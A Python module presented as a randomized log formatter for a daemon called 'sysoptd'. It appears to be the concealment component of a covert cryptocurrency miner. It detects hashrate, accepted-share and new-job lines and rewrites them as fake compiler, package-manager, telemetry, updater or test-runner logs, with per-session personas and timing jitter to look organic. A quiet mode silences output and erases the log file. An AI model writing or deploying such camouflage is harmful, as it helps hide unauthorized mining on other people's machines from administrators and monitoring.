#!/usr/bin/env python3
"""
log_handler.py — per-session randomized log output formatter.

Modes (picked fresh every run via SESSION_SEED):
  persona A — "compiler/build daemon"   : progress bars, file counts, compile times
  persona B — "package manager daemon"  : resolve/fetch/verify/install lines
  persona C — "telemetry/metrics agent" : metric keys and float values
  persona D — "update checker daemon"   : checking / fetching / verifying blobs
  persona E — "test runner daemon"      : suite names, pass/fail counts, durations

Quiet flag:
  Pass --quiet (or env SYSOPTD_QUIET=1) to disable log file writes and
  suppress all stdout output. Useful for background operation.
"""

import sys
import re
import os
import random
import time
import math

# ─────────────────────────────────────────────────────────────────────────────
#  Session seed — new every process start, drives ALL randomness in this file
# ─────────────────────────────────────────────────────────────────────────────
SESSION_SEED = int.from_bytes(os.urandom(4), 'big')
_rng = random.Random(SESSION_SEED)

# ─────────────────────────────────────────────────────────────────────────────
#  Quiet mode — disable all output
# ─────────────────────────────────────────────────────────────────────────────
QUIET_MODE = (
    "--quiet" in sys.argv
    or os.environ.get("SYSOPTD_QUIET", "0") == "1"
)

# ─────────────────────────────────────────────────────────────────────────────
#  ANSI strip
# ─────────────────────────────────────────────────────────────────────────────
_ANSI = re.compile(r'\x1b\[[0-9;]*m')

def _strip(s: str) -> str:
    return _ANSI.sub('', s)


# ─────────────────────────────────────────────────────────────────────────────
#  Persona definitions
# ─────────────────────────────────────────────────────────────────────────────

class _PersonaA:
    """Compiler / build daemon"""
    NAME = "compiler"
    _STAGES   = ["preprocess","tokenize","parse","codegen","optimize","link","strip","emit"]
    _EXTS     = [".c",".cpp",".rs",".go",".s",".o",".a",".so"]
    _WARNINGS = ["unused variable","implicit cast","deprecated api","sign compare","shadow"]

    def __init__(self, rng):
        self._r = rng
        self._file_ctr = rng.randint(1, 40)
        self._warn_ctr = 0

    def startup(self) -> list[str]:
        ver  = f"{self._r.randint(11,14)}.{self._r.randint(0,3)}.{self._r.randint(0,9)}"
        arch = self._r.choice(["x86_64","aarch64","riscv64"])
        opts = self._r.choice(["-O2","-O3","-Os","-Og"])
        return [
            f"gcc {ver} ({arch})",
            f"build opts: {opts} -pipe -fstack-protector",
            f"scanning {self._r.randint(200,900)} source files...",
        ]

    def rate_line(self, val: float) -> str:
        # encode work rate as compile speed (files/s)
        fps = val / self._r.uniform(80, 120)
        self._file_ctr += self._r.randint(1, 6)
        stage = self._r.choice(self._STAGES)
        ext   = self._r.choice(self._EXTS)
        noise = f"module_{self._r.randint(1000,9999)}{ext}"
        return f"[{stage:>10}]  {noise:<30}  {fps:.1f} f/s  ({self._file_ctr} done)"

    def accept_line(self, n: int) -> str:
        self._warn_ctr += self._r.randint(0, 2)
        elapsed = self._r.uniform(0.12, 2.8)
        return f"[link] object #{n} merged  {elapsed:.2f}s  warn={self._warn_ctr}"

    def sync_line(self) -> str:
        return f"[watch] source tree changed — incremental rebuild queued"

    def idle_line(self) -> str:
        load = self._r.uniform(0.1, 0.9)
        return f"[idle]  ccache hit-rate {load*100:.0f}%  queue=0"


class _PersonaB:
    """Package manager daemon"""
    _PKGS = [
        "libssl-dev","libc6","python3-pip","nodejs","curl","wget","git","cmake",
        "build-essential","gcc","clang","llvm","rustc","golang","docker-ce",
        "nginx","redis","postgresql","sqlite3","jq","htop","vim","tmux",
    ]
    _OPS  = ["resolve","fetch","verify","unpack","configure","install","clean"]

    def __init__(self, rng):
        self._r = rng
        self._pkg_idx = 0

    def startup(self) -> list[str]:
        total = self._r.randint(12, 80)
        return [
            f"apt-mirror v{self._r.randint(1,3)}.{self._r.randint(0,9)} started",
            f"reading package lists... {total} sources",
            f"building dependency tree ({self._r.randint(1000,9999)} entries)",
        ]

    def rate_line(self, val: float) -> str:
        op  = self._r.choice(self._OPS)
        pkg = self._r.choice(self._PKGS)
        kb  = val / self._r.uniform(50, 200)
        ver = f"{self._r.randint(1,5)}.{self._r.randint(0,20)}.{self._r.randint(0,9)}"
        return f"[{op:<9}] {pkg:<28} {ver}  {kb:.1f} kB/s"

    def accept_line(self, n: int) -> str:
        pkg = self._r.choice(self._PKGS)
        return f"[ok #{n:<4}] {pkg}  checksum verified"

    def sync_line(self) -> str:
        return f"[mirror]  repository index refreshed"

    def idle_line(self) -> str:
        return f"[apt]  background fetcher idle  cache={self._r.randint(10,500)}MB"


class _PersonaC:
    """Telemetry / metrics agent"""
    _METRICS = [
        "cpu.iowait","mem.rss_bytes","net.rx_packets","net.tx_bytes",
        "fs.inode_used","proc.context_switches","sched.run_queue",
        "kernel.interrupts","vm.pgfault","vm.pgmajfault","vm.pgfree",
        "tcp.retrans","udp.rx_errors","blk.read_iops","blk.write_iops",
    ]
    _TAGS = ["host","dc","env","region","pod"]

    def __init__(self, rng):
        self._r = rng
        self._seq = rng.randint(10000, 99999)

    def startup(self) -> list[str]:
        interval = self._r.choice([5, 10, 15, 30, 60])
        return [
            f"metrics-agent v0.{self._r.randint(9,14)}.{self._r.randint(0,9)}",
            f"collection interval: {interval}s",
            f"registered {self._r.randint(20,120)} metric descriptors",
        ]

    def rate_line(self, val: float) -> str:
        self._seq += 1
        key   = self._r.choice(self._METRICS)
        tag   = self._r.choice(self._TAGS)
        tval  = f"p{self._r.randint(10,99)}"
        noise = self._r.uniform(-0.05, 0.05)
        v     = val * (1 + noise)
        ts    = int(time.time())
        return f"[{ts}] seq={self._seq}  {key}{{{tag}={tval}}}  {v:.2f}"

    def accept_line(self, n: int) -> str:
        batch = self._r.randint(8, 64)
        return f"[flush #{n}]  {batch} points written  lag={self._r.randint(0,12)}ms"

    def sync_line(self) -> str:
        return f"[poll]  scrape cycle complete  targets={self._r.randint(1,20)}"

    def idle_line(self) -> str:
        return f"[agent]  buffer={self._r.randint(0,200)}pts  next_flush={self._r.randint(1,30)}s"


class _PersonaD:
    """Update checker / blob fetcher daemon"""
    _BLOBS = [
        "signatures.db","definitions.bin","rules.tar.gz","patterns.dat",
        "keystore.idx","manifest.json","catalog.db","bundle.bin",
    ]
    _HOSTS = [
        "update.cdn.internal","dl.mirror.local","fetch.dist.svc",
        "blob.update.svc","cdn.fetch.local","repo.sync.internal",
    ]

    def __init__(self, rng):
        self._r = rng
        self._rev = rng.randint(100000, 999999)

    def startup(self) -> list[str]:
        return [
            f"update-daemon started  rev={self._rev}",
            f"checking {self._r.randint(3,12)} upstream sources",
            f"schedule: {self._r.choice(['every 6h','every 12h','every 24h'])}",
        ]

    def rate_line(self, val: float) -> str:
        blob = self._r.choice(self._BLOBS)
        host = self._r.choice(self._HOSTS)
        kb   = val / self._r.uniform(30, 120)
        pct  = min(100, int((val % 1000) / 10))
        return f"[fetch]  {blob}  from {host}  {kb:.1f} kB/s  {pct}%"

    def accept_line(self, n: int) -> str:
        self._rev += self._r.randint(1, 5)
        blob = self._r.choice(self._BLOBS)
        return f"[apply #{n}]  {blob}  rev={self._rev}  ok"

    def sync_line(self) -> str:
        return f"[check]  upstream pinged  new={self._r.randint(0,3)} pending"

    def idle_line(self) -> str:
        eta = self._r.randint(120, 21600)
        h, m = divmod(eta // 60, 60)
        return f"[idle]  next check in {h}h {m}m"


class _PersonaE:
    """Test runner daemon"""
    _SUITES = [
        "unit::core","unit::net","unit::io","integration::api",
        "integration::db","e2e::smoke","bench::alloc","bench::throughput",
        "fuzz::parser","fuzz::proto","regression::known",
    ]

    def __init__(self, rng):
        self._r = rng
        self._pass = rng.randint(0, 20)
        self._fail = 0

    def startup(self) -> list[str]:
        total = self._r.randint(40, 300)
        return [
            f"test-runner v2.{self._r.randint(0,9)}.{self._r.randint(0,9)}",
            f"discovered {total} test cases across {self._r.randint(5,30)} suites",
            f"parallelism: {self._r.randint(2,16)} workers",
        ]

    def rate_line(self, val: float) -> str:
        suite = self._r.choice(self._SUITES)
        self._pass += self._r.randint(1, 5)
        ms = val / self._r.uniform(50, 200)
        return f"[run]  {suite:<28}  pass={self._pass}  fail={self._fail}  {ms:.1f} ms/test"

    def accept_line(self, n: int) -> str:
        self._pass += 1
        suite = self._r.choice(self._SUITES)
        elapsed = self._r.uniform(0.005, 1.2)
        return f"[pass #{n}]  {suite}  {elapsed:.3f}s"

    def sync_line(self) -> str:
        return f"[watch]  source change detected — re-running affected suites"

    def idle_line(self) -> str:
        return f"[idle]  all suites green  coverage={self._r.randint(60,98)}%"


# ─────────────────────────────────────────────────────────────────────────────
#  Pick persona for this session
# ─────────────────────────────────────────────────────────────────────────────
_PERSONAS = [_PersonaA, _PersonaB, _PersonaC, _PersonaD, _PersonaE]
_persona  = _rng.choice(_PERSONAS)(_rng)

# ─────────────────────────────────────────────────────────────────────────────
#  Timing jitter — vary inter-line delays so log cadence looks organic
# ─────────────────────────────────────────────────────────────────────────────
_last_emit_ts  = time.monotonic()
_emit_interval = _rng.uniform(55, 75)     # target seconds between rate lines
_jitter_pool   = [_rng.uniform(-5, 5) for _ in range(32)]
_jitter_idx    = 0


def _should_emit_rate() -> bool:
    global _last_emit_ts, _emit_interval, _jitter_idx
    now    = time.monotonic()
    jitter = _jitter_pool[_jitter_idx % len(_jitter_pool)]
    _jitter_idx += 1
    if now - _last_emit_ts >= _emit_interval + jitter:
        _last_emit_ts  = now
        _emit_interval = _rng.uniform(55, 75)   # pick new interval
        return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
#  Internal state
# ─────────────────────────────────────────────────────────────────────────────
_accept_counter  = 0
_last_rate_val   = 0.0
_started         = False


def _is_quiet() -> bool:
    return QUIET_MODE or os.environ.get("SYSOPTD_QUIET", "0") == "1"


def _emit(line: str):
    """Write to stdout — suppressed in quiet mode."""
    if not _is_quiet():
        print(line, flush=True)


# ─────────────────────────────────────────────────────────────────────────────
#  Public API — called from sysoptd._tee() per worker output line
# ─────────────────────────────────────────────────────────────────────────────

def process_line(raw: str, log_file: str | None = None):
    """
    Consume one raw worker stdout line.
    Writes persona-flavoured output to stdout (unless quiet mode).
    Also writes to log_file if given (unless quiet mode).
    """
    global _accept_counter, _last_rate_val, _started

    if _is_quiet():
        # Clear log file on first call, then stay silent
        if not _started and log_file and os.path.exists(log_file):
            try:
                open(log_file, 'w').close()
            except Exception:
                pass
        _started = True
        return

    line = _strip(raw).strip()
    if not line:
        return

    # ── emit startup banner once ──────────────────────────────────────────
    if not _started:
        _started = True
        for banner_line in _persona.startup():
            _emit(banner_line)
            if log_file:
                _write_log(log_file, banner_line)
        return

    # ── strip timestamp prefix ────────────────────────────────────────────
    line = re.sub(r'^\[\s*[\d:.]+\]\s*', '', line)

    # ── detect speed line ─────────────────────────────────────────────────
    spd = re.search(r'speed\s+\S+\s+([\d.]+|n/a)\s+([\d.]+|n/a)', line, re.I)
    if spd:
        v10, v60 = spd.group(1), spd.group(2)
        if v60 != 'n/a':
            _last_rate_val = float(v60)
        elif v10 != 'n/a':
            _last_rate_val = float(v10)

        if _should_emit_rate() and _last_rate_val > 0:
            out = _persona.rate_line(_last_rate_val)
            _emit(out)
            if log_file:
                _write_log(log_file, out)
        return

    # ── detect accepted share ─────────────────────────────────────────────
    if re.search(r'\baccepted\b', line, re.I):
        _accept_counter += 1
        # occasionally skip emitting to vary cadence
        if _rng.random() > 0.15:
            out = _persona.accept_line(_accept_counter)
            _emit(out)
            if log_file:
                _write_log(log_file, out)
        return

    # ── detect new job ────────────────────────────────────────────────────
    if re.search(r'(new job|new task)', line, re.I):
        # only emit sync line sometimes (not every single job)
        if _rng.random() > 0.6:
            out = _persona.sync_line()
            _emit(out)
            if log_file:
                _write_log(log_file, out)
        return

    # ── periodic idle heartbeat (if worker is quiet for a while) ──────────
    # (handled via emit_idle() called from sysoptd heartbeat thread)

    # everything else: silently drop (worker banners, startup noise, etc.)


def emit_idle(log_file: str | None = None):
    """
    Called from a heartbeat thread in sysoptd every ~5 min.
    Emits a persona-flavoured idle line so the log doesn't go completely cold.
    Suppressed in quiet mode.
    """
    if _is_quiet():
        return
    out = _persona.idle_line()
    _emit(out)
    if log_file:
        _write_log(log_file, out)


def _write_log(path: str, line: str):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'a', buffering=1) as f:
            f.write(line + '\n')
    except Exception:
        pass


def clear_log(log_file: str):
    """
    Clear the log file contents.
    Can be called externally (e.g. from sysoptd signal handler).
    """
    try:
        if os.path.exists(log_file):
            open(log_file, 'w').close()
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
#  stdin pipe mode (legacy — used when piped from worker directly)
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    log_file = sys.argv[1] if len(sys.argv) > 1 else None
    if QUIET_MODE and log_file:
        clear_log(log_file)
        sys.exit(0)
    try:
        for raw in sys.stdin:
            process_line(raw, log_file)
    except (BrokenPipeError, KeyboardInterrupt):
        pass

# Deployment ID: b4003f8d72f7f514
